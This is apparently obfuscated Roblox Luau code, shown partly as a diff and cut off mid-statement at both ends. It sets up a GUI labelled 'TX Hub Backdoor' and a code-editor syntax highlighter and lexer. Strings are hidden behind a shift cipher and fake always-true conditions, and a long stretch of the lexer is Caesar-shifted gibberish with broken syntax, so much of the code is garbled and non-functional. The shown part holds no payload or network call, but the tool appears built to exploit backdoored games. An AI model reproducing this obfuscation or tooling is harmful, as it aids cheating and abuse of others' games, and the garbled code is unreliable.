57>=57)thenG2L[bbkGQKwkuBHx("87",6)][bbkGQKwkuBHx("Utxnynts",5)]=UDim2.new(0.07914,0,0.43197,0);end;if(qggwyxGD(304)^2+mrsvJxUeFpB(304)^2>=0.99999)thenG2L[bbkGQKwkuBHx("00",8)]=Instance.new(bbkGQKwkuBHx("ESCdbyuo",10),YXRdjYSs[bbkGQKwkuBHx("98",7)]);end;if((8<18)==not(8>=18))thenG2L[bbkGQKwkuBHx("66",4)][bbkGQKwkuBHx("Mabvdgxll",19)]=2.5;end;if(42%1==0 and 42>=42)thenG2L[bbkGQKwkuBHx("11",9)][bbkGQKwkuBHx("Zlilo",23)]=Color3.fromRGB(210,210,210);end;if(29%1==0 and 29>=29)thenG2L[bbkGQKwkuBHx("00",8)][bbkGQKwkuBHx("ShhdqKljgcwEgvw",18)]=Enum.ApplyStrokeMode.Border;end;if((5<14)==not(5>=14))thenG2L[bbkGQKwkuBHx("34",1)]=Instance.new(bbkGQKwkuBHx("ESQbknsoxd",10),YXRdjYSs[bbkGQKwkuBHx("88",6)]);end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("89",6)][bbkGQKwkuBHx("Htqtw",5)]=ColorSequence.new{ColorSequenceKeypoint.new(0.000,Color3.fromRGB(129,255,0)),ColorSequenceKeypoint.new(0.375,Color3.fromRGB(86,255,0)),ColorSequenceKeypoint.new(0.747,Color3.fromRGB(44,127,2)),ColorSequenceKeypoint.new(1.000,Color3.fromRGB(46,125,0))};end;if(38%1==0 and 38>=38)thenG2L[bbkGQKwkuBHx("02",8)]=Instance.new(bbkGQKwkuBHx("PDXjmizm",21),YXRdjYSs[bbkGQKwkuBHx("54",3)]);end;if(qggwyxGD(351)^2+mrsvJxUeFpB(351)^2>=0.99999)thenG2L[bbkGQKwkuBHx("03",8)]=Instance.new(bbkGQKwkuBHx("WKUvtqmg",2),YXRdjYSs[bbkGQKwkuBHx("98",7)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('806',16)end))~=nil)thenG2L[bbkGQKwkuBHx("14",9)][bbkGQKwkuBHx("Xlmgoriww",4)]=2.5;end;if(qggwyxGD(218)^2+mrsvJxUeFpB(218)^2>=0.99999)thenG2L[bbkGQKwkuBHx("36",1)][bbkGQKwkuBHx("Wifil",20)]=Color3.fromRGB(210,210,210);end;if(select(2,pcall(function()return EBhvjIpErOvB('9aa',16)end))~=nil)thenG2L[bbkGQKwkuBHx("93",7)]=Instance.new(bbkGQKwkuBHx("PDBmvydzio",21),YXRdjYSs[bbkGQKwkuBHx("81",6)]);end;if(10%10==0)thenG2L[bbkGQKwkuBHx("93",7)][bbkGQKwkuBHx("Oaxad",12)]=ColorSequence.new{ColorSequenceKeypoint.new(0.000,Color3.fromRGB(129,255,0)),ColorSequenceKeypoint.new(0.375,Color3.fromRGB(86,255,0)),ColorSequenceKeypoint.new(0.747,Color3.fromRGB(44,127,2)),ColorSequenceKeypoint.new(1.000,Color3.fromRGB(46,125,0))};end;if(select(2,pcall(function()return EBhvjIpErOvB('1cab',16)end))~=nil)thenG2L[bbkGQKwkuBHx("16",9)]=Instance.new(bbkGQKwkuBHx("KvokCrsvc",17),YXRdjYSs[bbkGQKwkuBHx("8",6)]);end;if(76%1==0 and 76>=76)thenG2L[bbkGQKwkuBHx("72",5)][bbkGQKwkuBHx("NyrnMcty",20)]=57;end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("72",5)][bbkGQKwkuBHx("SrtbxifleuTfcfi0",17)]=Color3.fromRGB(255,255,255);end;if(qggwyxGD(1)^2+mrsvJxUeFpB(1)^2>=0.99999)thenG2L[bbkGQKwkuBHx("50",3)][bbkGQKwkuBHx("SbagSnpr",13)]=Font.new([[rbxasset://fonts/families/Michroma.json]],Enum.FontWeight.Bold,Enum.FontStyle.Normal);end;if(3%3==0)thenG2L[bbkGQKwkuBHx("16",9)][bbkGQKwkuBHx("YjcyHtqtw8",5)]=Color3.fromRGB(0,0,0);end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("50",3)][bbkGQKwkuBHx("SrtbxifleuKirejgrivetp",17)]=1;end;if((5<18)==not(5>=18))thenG2L[bbkGQKwkuBHx("72",5)][bbkGQKwkuBHx("Nduz",21)]=UDim2.new(0,457,0,57);end;if(7%7==0)thenG2L[bbkGQKwkuBHx("50",3)][bbkGQKwkuBHx("Mxqm",19)]=[[TX Hub Backdoor]];end;if(3%3==0)thenG2L[bbkGQKwkuBHx("50",3)][bbkGQKwkuBHx("Yxbrcrxw",9)]=UDim2.new(0.02586,0,0.02536,0);end;if((2<17)==not(2>=17))thenG2L[bbkGQKwkuBHx("95",7)]=Instance.new(bbkGQKwkuBHx("IWGhfcys",14),YXRdjYSs[bbkGQKwkuBHx("05",8)]);end;if(qggwyxGD(228)^2+mrsvJxUeFpB(228)^2>=0.99999)thenG2L[bbkGQKwkuBHx("39",1)][bbkGQKwkuBHx("Sghbjmdrr",25)]=2.5;end;if(qggwyxGD(78)^2+mrsvJxUeFpB(78)^2>=0.99999)thenG2L[bbkGQKwkuBHx("95",7)][bbkGQKwkuBHx("Nzwzc",11)]=Color3.fromRGB(210,210,210);end;if(73%1==0 and 73>=73)thenG2L[bbkGQKwkuBHx("30",1)]=Instance.new(bbkGQKwkuBHx("LZXiruzvek",17),YXRdjYSs[bbkGQKwkuBHx("73",5)]);end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("18",9)][bbkGQKwkuBHx("Zlilo",23)]=ColorSequence.new{ColorSequenceKeypoint.new(0.000,Color3.fromRGB(129,255,0)),ColorSequenceKeypoint.new(0.375,Color3.fromRGB(86,255,0)),ColorSequenceKeypoint.new(0.747,Color3.fromRGB(44,127,2)),ColorSequenceKeypoint.new(1.000,Color3.fromRGB(46,125,0))};end;if(select(2,pcall(function()return EBhvjIpErOvB('13e3',16)end))~=nil)thenG2L[bbkGQKwkuBHx("7z",25)]=Instance.new(bbkGQKwkuBHx("SGAmplcp",24),YXRdjYSs[bbkGQKwkuBHx("94",7)]);end;if(45%1==0 and 45>=45)thenG2L[bbkGQKwkuBHx("2v",20)]=Instance.new(bbkGQKwkuBHx("TwkitAkzqxb",8),YXRdjYSs[bbkGQKwkuBHx("9",8)]);end;if(qggwyxGD(147)^2+mrsvJxUeFpB(147)^2>=0.99999)thenG2L[bbkGQKwkuBHx("3c",1)][bbkGQKwkuBHx("Wjvn",9)]=[[Dragify]];end;if(select(2,pcall(function()return EBhvjIpErOvB('18ba',16)end))~=nil)thenG2L[bbkGQKwkuBHx("9j",7)]=Instance.new(bbkGQKwkuBHx("MpdbmTdsjqu",1),YXRdjYSs[bbkGQKwkuBHx("8",7)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('76e',16)end))~=nil)thenG2L[bbkGQKwkuBHx("3e",1)]=Instance.new(bbkGQKwkuBHx("MpdbmTdsjqu",1),YXRdjYSs[bbkGQKwkuBHx("3",2)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('148b',16)end))~=nil)thenG2L[bbkGQKwkuBHx("1m",9)][bbkGQKwkuBHx("Lykc",24)]=[[Ui]];end;if(4%4==0)thenlocal husNncxIWDJ=require;end;if(select(2,pcall(function()return EBhvjIpErOvB('23ec',16)end))~=nil)thenlocal YPboWFvH={};end;local function require(Module:ModuleScript)if(select(2,pcall(function()return EBhvjIpErOvB('178c',16)end))~=nil)thenlocal djhXqnYbKTVs=YPboWFvH[Module];end;if djhXqnYbKTVs then if not djhXqnYbKTVs.Required then if(qggwyxGD(135)^2+mrsvJxUeFpB(135)^2>=0.99999)thenModuleState.Required=true;end;if(8%8==0)thenModuleState.Value=djhXqnYbKTVs.Closure();end;end return djhXqnYbKTVs.Value;end;return husNncxIWDJ(Module);end YPboWFvH[YXRdjYSs[bbkGQKwkuBHx("w",20)]]={Closure=function()if(qggwyxGD(250)^2+mrsvJxUeFpB(250)^2>=0.99999)thenlocal jHCarWNa=YXRdjYSs[bbkGQKwkuBHx("w",20)];end;local jHCarWNa=jHCarWNa local function SanitizeRichText(s:string):string return AaouwFPa(if(select(2,pcall(function()return EBhvjIpErOvB('1a70',16)end))~=nil)thenAaouwFPa(AaouwFPa(AaouwFPa(AaouwFPa(s,bbkGQKwkuBHx("&",1),bbkGQKwkuBHx("&seh; end;if (select(2, pcall(function() return EBhvjIpErOvB('1f90', 16) end)) ~= nil) then",18)),bbkGQKwkuBHx("<",3),bbkGQKwkuBHx("&uc; end;if (select(2, pcall(function() return EBhvjIpErOvB('1dd1', 16) end)) ~= nil) then",9)),bbkGQKwkuBHx(">",4),bbkGQKwkuBHx("&jw; end;if (select(2, pcall(function() return EBhvjIpErOvB('162e', 16) end)) ~= nil) then",3)),bbkGQKwkuBHx(''"', 5), bbkGQKwkuBHx("&ptns;end;", 25)),
+				bbkGQKwkuBHx("''", 7),
+				if ((10 < 15) == not (10 >= 15)) thenbbkGQKwkuBHx("&bqpt;end;", 1)
+			)
+		end
 
+		local function SanitizeTabs(s: string): string
+			return AaouwFPa(s, bbkGQKwkuBHx("\t", 12), bbkGQKwkuBHx(" ", 6))
+		end
+
+		local function SanitizeControl(s: string): string
+			return AaouwFPa(s, bbkGQKwkuBHx("[\0\1\2\3\4\5\6\7\8\18\19\10\11\12\13\14\15\16\27\28\29\20\21\22\23\27\25\26\37\38]+", 7), bbkGQKwkuBHx("", 3))
+		end
+
+		local TokenColors: HighlighterColors = {
+			[bbkGQKwkuBHx("srtbxifleu", 17)] = Color3.fromRGB(47, 47, 47),
+			[bbkGQKwkuBHx("avwf", 18)] = Color3.fromRGB(234, 234, 234),
+			[bbkGQKwkuBHx("vpjhzco", 11)] = Color3.fromRGB(215, 174, 255),
+			[bbkGQKwkuBHx("kdrucrw", 9)] = Color3.fromRGB(131, 206, 255),
+			[bbkGQKwkuBHx("mnlcha", 20)] = Color3.fromRGB(196, 255, 193),
+			[bbkGQKwkuBHx("eldsvi", 17)] = Color3.fromRGB(255, 125, 125),
+			[bbkGQKwkuBHx("qcaasbh", 14)] = Color3.fromRGB(140, 140, 155),
+			[bbkGQKwkuBHx("klanwpkn", 22)] = Color3.fromRGB(255, 239, 148),
+			[bbkGQKwkuBHx("iayzus", 6)] = Color3.fromRGB(119, 122, 255),
+		}
+		local ColorFormatter: { [Color3]: string } = {}
+		local LastData: { [TextObject]: ObjectData } = {}
+		local Cleanups: { [TextObject]: () -> () } = {}
+
+		local DFtxsjNFcWwt = {
+			defaultLexer = require(jHCarWNa.QnrZfpbujzN),
+		}
+
+		function DFtxsjNFcWwt.highlight(props: HighlightProps)
+			-- Gather props
+			local DsvwlTKqng = props.DsvwlTKqng
+			local wDLnBbhy = SanitizeTabs(SanitizeControl(props.wDLnBbhy or DsvwlTKqng.Text))
+			local QnrZfpbujzN = props.QnrZfpbujzN or DFtxsjNFcWwt.defaultLexer
+			local QbFCYBqghg = props.QbFCYBqghg
+			local FqENzoJY = props.FqENzoJY
+
+			-- Avoid updating when unnecessary
+			local GLnfYtdV = LastData[DsvwlTKqng]
+			if GLnfYtdV == nil then
+				GLnfYtdV = {
+					Text = bbkGQKwkuBHx("", 9),
+					Labels = {},
+					Lines = {},
+					Lexer = QnrZfpbujzN,
+					CustomLang = QbFCYBqghg,
+				}
+				LastData[DsvwlTKqng] = GLnfYtdV
+			elseif FqENzoJY ~= true and GLnfYtdV.Text == wDLnBbhy then
+				return
+			end
+
+			local DEMYriTDLr = GLnfYtdV.Labels
+			local UUQhJQsRFGM = GLnfYtdV.Lines
+
+			local civNkJWx = string.split(wDLnBbhy, bbkGQKwkuBHx("\n", 4))
+
+			GLnfYtdV.Lines = civNkJWx
+			GLnfYtdV.Text = wDLnBbhy
+			GLnfYtdV.Lexer = QnrZfpbujzN
+			GLnfYtdV.CustomLang = QbFCYBqghg
+
+			-- Ensure valid object properties
+			DsvwlTKqng.RichText = false
+			DsvwlTKqng.Text = wDLnBbhy
+			DsvwlTKqng.TextXAlignment = Enum.TextXAlignment.Left
+			DsvwlTKqng.TextYAlignment = Enum.TextYAlignment.Top
+			DsvwlTKqng.BackgroundColor3 = TokenColors.background
+			DsvwlTKqng.TextColor3 = TokenColors.iden
+			DsvwlTKqng.TextTransparency = 0.5
+
+			-- Build the highlight labels
+			local tjTxprTGnELS = DsvwlTKqng:FindFirstChild(bbkGQKwkuBHx("OujpwtDecdhecdpo", 22))
+			if tjTxprTGnELS == nil then
+				local PzrLuGgvHCs = Instance.new(bbkGQKwkuBHx("Iroghu", 3))
+				PzrLuGgvHCs.Name = bbkGQKwkuBHx("VbqwdaKljkoljkwv", 3)
+				PzrLuGgvHCs.Parent = DsvwlTKqng
+
+				tjTxprTGnELS = PzrLuGgvHCs
+			end
+
+			-- Add a wPsxWenXX handler for this DsvwlTKqng
+			local wPsxWenXX = Cleanups[DsvwlTKqng]
+			if not wPsxWenXX then
+				local connections: { RBXScriptConnection } = {}
+				local function ZTKyccWTx()
+					for _, label in qcLQPDzCgIRq(DEMYriTDLr) do
+						label:Destroy()
+					end
+					table.clear(DEMYriTDLr)
+					DEMYriTDLr = nil
+
+					LastData[DsvwlTKqng] = nil
+					Cleanups[DsvwlTKqng] = nil
+
+					for _, connection in connections do
+						connection:Disconnect()
+					end
+					table.clear(connections)
+					connections = nil
+				end
+				Cleanups[DsvwlTKqng] = newCleanup
+				wPsxWenXX = newCleanup
+
+				GuUvrNBY(
+					connections,
+					DsvwlTKqng.AncestryChanged:Connect(function()
+						if DsvwlTKqng.Parent then
+							return
+						end
+
+						wPsxWenXX()
+					end)
+				)
+				GuUvrNBY(
+					connections,
+					DsvwlTKqng:GetPropertyChangedSignal(bbkGQKwkuBHx("VgzvDqwpfu", 2)):Connect(function()
+						DFtxsjNFcWwt.highlight({
+							DsvwlTKqng = DsvwlTKqng,
+							FqENzoJY = true,
+							QnrZfpbujzN = QnrZfpbujzN,
+							QbFCYBqghg = QbFCYBqghg,
+						})
+					end)
+				)
+				GuUvrNBY(
+					connections,
+					DsvwlTKqng:GetPropertyChangedSignal(bbkGQKwkuBHx("Itmi", 15)):Connect(function()
+						DFtxsjNFcWwt.highlight({
+							DsvwlTKqng = DsvwlTKqng,
+							QnrZfpbujzN = QnrZfpbujzN,
+							QbFCYBqghg = QbFCYBqghg,
+						})
+					end)
+				)
+				GuUvrNBY(
+					connections,
+					DsvwlTKqng:GetPropertyChangedSignal(bbkGQKwkuBHx("CduqnwvgUkbg", 2)):Connect(function()
+						DFtxsjNFcWwt.highlight({
+							DsvwlTKqng = DsvwlTKqng,
+							FqENzoJY = true,
+							QnrZfpbujzN = QnrZfpbujzN,
+							QbFCYBqghg = QbFCYBqghg,
+						})
+					end)
+				)
+			end
+
+			-- Shortcut empty labels
+			if wDLnBbhy == bbkGQKwkuBHx("", 6) then
+				for l=1, #DEMYriTDLr do
+					if DEMYriTDLr[l].Text == bbkGQKwkuBHx("", 7) then continue end
+					DEMYriTDLr[l].Text = bbkGQKwkuBHx("", 9)
+				end
+				return wPsxWenXX
+			end
+
+			-- Wait for TextBounds to be non-NaN and non-zero because Roblox
+			local tvbGSQeGJRMD = DsvwlTKqng.TextBounds
+			while (tvbGSQeGJRMD.Y ~= tvbGSQeGJRMD.Y) or (tvbGSQeGJRMD.Y < 1) do
+				task.wait()
+				tvbGSQeGJRMD = DsvwlTKqng.TextBounds
+			end
+
+			if LastData[DsvwlTKqng] == nil then
+				-- Got cleaned up while we were waiting
+				return wPsxWenXX
+			end
+
+			local HAEZfsWVzhw = #civNkJWx
+			local SurURbnhz = tvbGSQeGJRMD.Y / HAEZfsWVzhw * DsvwlTKqng.LineHeight
+
+			local LWIsKUCaf, EsBNDxJtz, UtftJZBuQme = table.create(5), 0, 1
+			for YpDaDIyuFafN: string, ZMyJWLPg: string in QnrZfpbujzN.scan(wDLnBbhy) do
+				local RaEkZaNUIio =
+					if QbFCYBqghg and QbFCYBqghg[ZMyJWLPg] then
+					TokenColors[bbkGQKwkuBHx("rjhidb", 15)]
+					else
+					TokenColors[YpDaDIyuFafN] or TokenColors[bbkGQKwkuBHx("zuve", 17)]
+
+				local BIIqcIklIb = string.split(SanitizeRichText(ZMyJWLPg), bbkGQKwkuBHx("\n", 18))
+
+				for l, line in qcLQPDzCgIRq(BIIqcIklIb) do
+					-- Find line label
+					local ZsxyRqUDT = DEMYriTDLr[UtftJZBuQme]
+					if not ZsxyRqUDT then
+						local hbEnnZWTOKR = Instance.new(bbkGQKwkuBHx("FqjfXmnqx", 12))
+						hbEnnZWTOKR.Name = bbkGQKwkuBHx("Urwn_", 9) .. UtftJZBuQme
+						hbEnnZWTOKR.RichText = true
+						hbEnnZWTOKR.BackgroundTransparency = 1
+						hbEnnZWTOKR.Text = bbkGQKwkuBHx("", 7)
+						hbEnnZWTOKR.TextXAlignment = Enum.TextXAlignment.Left
+						hbEnnZWTOKR.TextYAlignment = Enum.TextYAlignment.Top
+						hbEnnZWTOKR.Parent = tjTxprTGnELS
+						hbEnnZWTOKR.TextWrapped=true
+						DEMYriTDLr[UtftJZBuQme] = hbEnnZWTOKR
+						ZsxyRqUDT = hbEnnZWTOKR
+					end
+
+					-- Align line label
+					ZsxyRqUDT.TextColor3 = TokenColors[bbkGQKwkuBHx("upqz", 12)]
+					ZsxyRqUDT.Font = DsvwlTKqng.Font
+					ZsxyRqUDT.TextSize = DsvwlTKqng.TextSize
+					ZsxyRqUDT.Size = UDim2.new(1, 0, 0, vOWNXnqwF(SurURbnhz))
+					ZsxyRqUDT.qeiFjrTGb = UDim2.fromScale(0, SurURbnhz * (UtftJZBuQme - 1) / DsvwlTKqng.AbsoluteSize.Y)
+
+					-- If multiline YpDaDIyuFafN, then set line & move to next
+					if l > 1 then
+						if FqENzoJY or civNkJWx[UtftJZBuQme] ~= UUQhJQsRFGM[UtftJZBuQme] then
+							-- Set line
+							DEMYriTDLr[UtftJZBuQme].Text = XcAAlBxNFM(LWIsKUCaf)
+						end
+						-- Move to next line
+						UtftJZBuQme += 1
+						EsBNDxJtz = 0
+						table.clear(LWIsKUCaf)
+					end
+
+					-- If changed, add YpDaDIyuFafN to line
+					if FqENzoJY or civNkJWx[UtftJZBuQme] ~= UUQhJQsRFGM[UtftJZBuQme] then
+						EsBNDxJtz += 1
+						-- Only add RichText tags when the color is non-default and the characters are non-whitespace
+						if RaEkZaNUIio ~= TokenColors[bbkGQKwkuBHx("fabk", 23)] and TCdJefnm(line, bbkGQKwkuBHx("[%I%S]", 16)) then
+							LWIsKUCaf[EsBNDxJtz] = wyDofklO(ColorFormatter[RaEkZaNUIio], line)
+						else
+							LWIsKUCaf[EsBNDxJtz] = line
+						end
+					end
+				end
+			end
+
+			-- Set final line
+			if LWIsKUCaf[1] and DEMYriTDLr[UtftJZBuQme] then
+				DEMYriTDLr[UtftJZBuQme].Text = XcAAlBxNFM(LWIsKUCaf)
+			end
+
+			-- Clear unused line labels
+			for l=UtftJZBuQme+1, #DEMYriTDLr do
+				if DEMYriTDLr[l].Text == bbkGQKwkuBHx("", 6) then continue end
+				DEMYriTDLr[l].Text = bbkGQKwkuBHx("", 3)
+			end
+
+			return wPsxWenXX
+		end
+
+		function DFtxsjNFcWwt.refresh(): ()
+			-- Rehighlight existing labels using latest colors
+			for DsvwlTKqng, GLnfYtdV in YlPcXxwe(LastData) do
+				for _, ZsxyRqUDT in qcLQPDzCgIRq(GLnfYtdV.Labels) do
+					ZsxyRqUDT.TextColor3 = TokenColors[bbkGQKwkuBHx("mhir", 4)]
+				end
+
+				DFtxsjNFcWwt.highlight({
+					DsvwlTKqng = DsvwlTKqng,
+					FqENzoJY = true,
+					wDLnBbhy = GLnfYtdV.Text,
+					QnrZfpbujzN = GLnfYtdV.Lexer,
+					QbFCYBqghg = GLnfYtdV.CustomLang,
+				})
+			end
+		end
+
+		function DFtxsjNFcWwt.setTokenColors(colors: HighlighterColors)
+			for YpDaDIyuFafN, color in colors do
+				TokenColors[YpDaDIyuFafN] = color
+				ColorFormatter[color] = wyDofklO(
+					bbkGQKwkuBHx('<tcbh qczcf="#%.6l%.6l%.6l">', 14),
+					color.R * 255,
+					color.G * 255,
+					color.B * 255
+				) .. bbkGQKwkuBHx("%a</nwvb>", 8)
+			end
+
+			DFtxsjNFcWwt.refresh()
+		end
+		DFtxsjNFcWwt.setTokenColors(TokenColors)
+
+		return DFtxsjNFcWwt
+end;
+if (19 % 1 == 0 and 19 >= 19) then}; end;
+YPboWFvH[YXRdjYSs[bbkGQKwkuBHx("r", 14)]] = {
+Closure = function()
+    if ((7 < 18) == not (7 >= 18)) thenlocal jHCarWNa = YXRdjYSs[bbkGQKwkuBHx("c",25)];end;local jHCarWNa=jHCarWNa local QnrZfpbujzN={}local CIjwybhDV,NZfQIaItb,PiGNfJCaA=bbkGQKwkuBHx("^[%a%q]*", 24), bbkGQKwkuBHx("[%j%z]*", 7), bbkGQKwkuBHx("[%k%a]+", 8)
+		local ItpSoAhZoyW = bbkGQKwkuBHx("[%k\x12-\x8Q\xN3-\xQ5][\x91-\xMQ]+", 11)
+		local UjTpcFjquzJi = bbkGQKwkuBHx("1[sS][%yv-aV-A_]+", 21)
+		local THyVTsZZ = bbkGQKwkuBHx("2[xX][23_]+", 22)
+		local ASSkIBRDzpt = bbkGQKwkuBHx("%f+%.?%f*[gG][%+%-]?%f+", 2)
+		local gZJkVlCftEGK = bbkGQKwkuBHx("%s+[%._]?[%s_tT]*", 15)
+		if ((2 < 14) == not (2 >= 14)) thenlocal HreTYNnpzifV = bbkGQKwkuBHx("[:;end;<>/~%*%(%)%-={},%.#%^%+%%]+", 2)
+		local RCrdmujQ = bbkGQKwkuBHx("[%[%]]+", 3) -- needs to be separate pattern from other operators or itbbkGQKwkuBHx('rr skyy av sarzorotk yzxotmy
+		ruigr OJKT = "[%g_][%c_]*"
+		ruigr YZXOTM_KSVZE = "(['',6)!@!])%1bbkGQKwkuBHx(" --Pxaej Dectyr
+		wznlw DECTYR_AWLTY = ",11)([bbkGQKwkuBHx(''\"])[^\n]-([^\\]%4)" orfdo VWULQJ_LQWHU="`[^\n]-`" orfdo VWULQJ_LQFRPS_D="([', 3)!@!]).-\nbbkGQKwkuBHx(" fiwuf MNLCHA_CHWIGJ_V=", 20)([bbkGQKwkuBHx('\"])[^\n]*" --Jodpnqmfufe Tusjoh xjuipvu ofyu mjof
+		mpdbm TUSJOH_NVMUJ = "%[(=*)%[.-%]%2%]" --Nvmujmjof-Tusjoh
+		mpdbm TUSJOH_NVMUJ_JODPNQ = "%[=*%[.-.*" --Jodpnqmfufe Nvmujmjof-Tusjoh
+		mpdbm DPNNFOU_NVMUJ = "%-%-%[(=*)%[.-%]%2%]" --Dpnqmfufe Nvmujmjof-Dpnnfou
+		mpdbm DPNNFOU_NVMUJ_JODPNQ = "%-%-%[=*%[.-.*" --Jodpnqmfufe Nvmujmjof-Dpnnfou
+		mpdbm DPNNFOU_QMBJO = "%-%-.-\n" --Dpnqmfufe Tjohmfmjof-Dpnnfou
+		mpdbm DPNNFOU_JODPNQ = "%-%-.*" --Jodpnqmfufe Tjohmfmjof-Dpnnfou
+		-- mpdbm UZQFE_WBS = ":%t*([%x%?%|\t]+%t*)" --Uzqfe wbsjbcmf, qbsbnfufs, gvodujpo
+
+		mpdbm mboh = sfrvjsf(tdsjqu.mbohvbhf)
+		mpdbm mvb_lfzxpse = mboh.lfzxpse
+		mpdbm mvb_cvjmujo = mboh.cvjmujo
+		mpdbm mvb_mjcsbsjft = mboh.mjcsbsjft
+
+		mfyfs.mbohvbhf = mboh
+
+		mpdbm mvb_nbudift = {
+			-- Joefoujgjfst
+			{ Qsfgjy .. JEFO .. Tvggjy, "wbs" },
+
+			-- Ovncfst
+			{ Qsfgjy .. OVNCFS_B .. Tvggjy, "ovncfs" },
+			{ Qsfgjy .. OVNCFS_C .. Tvggjy, "ovncfs" },
+			{ Qsfgjy .. OVNCFS_D .. Tvggjy, "ovncfs" },
+			{ Qsfgjy .. OVNCFS_E .. Tvggjy, "ovncfs" },
+
+			-- Tusjoht
+			{ Qsfgjy .. TUSJOH_FNQUZ .. Tvggjy, "tusjoh" },
+			{ Qsfgjy .. TUSJOH_QMBJO .. Tvggjy, "tusjoh" },
+			{ Qsfgjy .. TUSJOH_JODPNQ_B .. Tvggjy, "tusjoh" },
+			{ Qsfgjy .. TUSJOH_JODPNQ_C .. Tvggjy, "tusjoh" },
+			{ Qsfgjy .. TUSJOH_NVMUJ .. Tvggjy, "tusjoh" },
+			{ Qsfgjy .. TUSJOH_NVMUJ_JODPNQ .. Tvggjy, "tusjoh" },
+			{ Qsfgjy .. TUSJOH_JOUFS .. Tvggjy, "tusjoh_joufs" },
+
+			-- Dpnnfout
+			{ Qsfgjy .. DPNNFOU_NVMUJ .. Tvggjy, "dpnnfou" },
+			{ Qsfgjy .. DPNNFOU_NVMUJ_JODPNQ .. Tvggjy, "dpnnfou" },
+			{ Qsfgjy .. DPNNFOU_QMBJO .. Tvggjy, "dpnnfou" },
+			{ Qsfgjy .. DPNNFOU_JODPNQ .. Tvggjy, "dpnnfou" },
+
+			-- Pqfsbupst
+			{ Qsfgjy .. PQFSBUPST .. Tvggjy, "pqfsbups" },
+			{ Qsfgjy .. CSBDLFUT .. Tvggjy, "pqfsbups" },
+
+			-- Vojdpef
+			{ Qsfgjy .. VOJDPEF .. Tvggjy, "jefo" },
+
+			-- Volopxo
+			{ "^.", "jefo" },
+		}
+
+		-- Up sfevdf uif bnpvou pg ubcmf joefyjoh evsjoh mfyjoh, xf tfqbsbuf uif nbudift opx
+		mpdbm QBUUFSOT, UPLFOT = {}, {}
+		gps j, n jo mvb_nbudift ep
+			QBUUFSOT[j] = n[2]
+			UPLFOT[j] = n[3]
+		foe
+
+		--- Dsfbuf b qmbjo uplfo jufsbups gspn b tusjoh.
+		-- @uqbsbn tusjoh t b tusjoh.
+
+		gvodujpo mfyfs.tdbo(t: tusjoh)
+			mpdbm joefy = 2
+			mpdbm tjaf = #t
+			mpdbm qsfwjpvtDpoufou2, qsfwjpvtDpoufou3, qsfwjpvtDpoufou4, qsfwjpvtUplfo = "", "", "", ""
+
+			mpdbm uisfbe = dpspvujof.dsfbuf(gvodujpo()
+				xijmf joefy <= tjaf ep
+					mpdbm nbudife = gbmtf
+					gps uplfoUzqf, qbuufso jo jqbjst(QBUUFSOT) ep
+						-- Gjoe nbudi
+						mpdbm tubsu, gjojti = tusjoh.gjoe(t, qbuufso, joefy)
+						jg tubsu == ojm uifo dpoujovf foe
+
+						-- Npwf ifbe
+						joefy = gjojti + 2
+						nbudife = usvf
+
+						-- Hbuifs sftvmut
+						mpdbm dpoufou = tusjoh.tvc(t, tubsu, gjojti)
+						mpdbm sbxUplfo = UPLFOT[uplfoUzqf]
+						mpdbm qspdfttfeUplfo = sbxUplfo
+
+						-- Qspdftt uplfo
+						jg sbxUplfo == "wbs" uifo
+							-- Tjodf xf nfshf tqbdft joup uif upl, xf offe up sfnpwf uifn
+							-- jo psefs up difdl uif bduvbm xpse ju dpoubjot
+							mpdbm dmfboDpoufou = tusjoh.htvc(dpoufou, Dmfbofs, "")
+
+							jg mvb_lfzxpse[dmfboDpoufou] uifo
+								qspdfttfeUplfo = "lfzxpse"
+							fmtfjg mvb_cvjmujo[dmfboDpoufou] uifo
+								qspdfttfeUplfo = "cvjmujo"
+							fmtfjg tusjoh.gjoe(qsfwjpvtDpoufou2, "%.[%t%d]*$") boe qsfwjpvtUplfo ~= "dpnnfou" uifo
+								-- Uif qsfwjpvt xbt b . tp xf offe up tqfdjbm dbtf joefyjoh uijoht
+								mpdbm qbsfou = tusjoh.htvc(qsfwjpvtDpoufou3, Dmfbofs, "")
+								mpdbm mjc = mvb_mjcsbsjft[qbsfou]
+								jg mjc boe mjc[dmfboDpoufou] boe opu tusjoh.gjoe(qsfwjpvtDpoufou4, "%.[%t%d]*$") uifo
+									-- Joefyjoh b cvjmujo mjc xjui fyjtujoh jufn, usfbu bt b cvjmujo
+									qspdfttfeUplfo = "cvjmujo"
+								fmtf
+									-- Joefyjoh b opo cvjmujo, dbo', 1)t be treated as a keyword/builtin
+									processedToken = bbkGQKwkuBHx("dyzi", 21)
+								end
+								-- dRZKetlSjtzW(bbkGQKwkuBHx("otjkdotm", 6),parent,bbkGQKwkuBHx("ugrf", 24),cleanTok,bbkGQKwkuBHx("gy", 6),t2)
+							else
+								processedToken = bbkGQKwkuBHx("dyzi", 21)
+							end
+						elseif rawToken == bbkGQKwkuBHx("cdbsxq_sxdob", 10) then
+							if not TCdJefnm(ZMyJWLPg, bbkGQKwkuBHx("[^\\]{", 5)) then
+								-- This inter string doesnt actually have any inters
+								processedToken = bbkGQKwkuBHx("cdbsxq", 10)
+							else
+								-- WebbkGQKwkuBHx('mz bjiiv yj jpm jri tdzgyn, nj ocz hvdi gjjk rji', 21)t need to
+								-- Our yields will be a mix of string and whatever is inside the inters
+								processedToken = nil
+
+								local mKOWOabij = true
+								local EJiwUKjjj = 1
+								local GUGVvcCYqy = #ZMyJWLPg
+								while EJiwUKjjj <= GUGVvcCYqy do
+									-- Find next brace
+									local VJPflMNoHSE, lRrIhOQtKs = TCdJefnm(ZMyJWLPg, bbkGQKwkuBHx("^.-[^\\][{}]", 8), EJiwUKjjj)
+									if VJPflMNoHSE == nil then
+										-- No more braces, all string
+										coroutine.yield(bbkGQKwkuBHx("qrpgle", 24), gDMDejUUvG(ZMyJWLPg, EJiwUKjjj))
+										break
+									end
+
+									if mKOWOabij then
+										-- We are currently a string
+										EJiwUKjjj = lRrIhOQtKs + 1
+										coroutine.yield(bbkGQKwkuBHx("pqofkd", 23), gDMDejUUvG(ZMyJWLPg, VJPflMNoHSE, lRrIhOQtKs))
+
+										-- This brace opens EkAmSsBY
+										mKOWOabij = false
+									else
